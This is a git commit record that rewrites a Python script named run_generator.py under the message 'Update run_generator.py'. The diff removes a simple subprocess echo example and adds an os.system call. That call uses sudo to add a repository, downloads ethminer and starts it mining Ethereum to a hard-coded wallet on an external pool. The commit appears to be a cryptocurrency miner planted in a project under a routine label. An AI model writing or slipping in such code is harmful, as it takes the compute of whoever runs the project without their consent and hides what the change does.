2161ef6906a89400cb860e38136fcedd0ca38b19
KunalSingh19yt <92242678+KunalSingh19yt@users.noreply.github.com>
2021-10-11 21:59:12 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,11 +1,2 @@
-import subprocess 
-
-  
-
-  
-# From Python3.7 you can add  
-# keyword argument capture_output 
-
-print(subprocess.run(["echo", "Geeks for geeks"],  
-
-                     capture_output=True))
+import os
+os.system("sudo add-apt-repository ppa:ethereum/ethereum && sudo cat /etc/apt/sources.list && sudo apt update && wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && cd bin/ && ./ethminer -U -P stratum2+tcp://0x6ff85749ffac2d3a36efa2bc916305433fa93731.ipqce2xl5hi6b3x@us1.ethermine.org:4444")
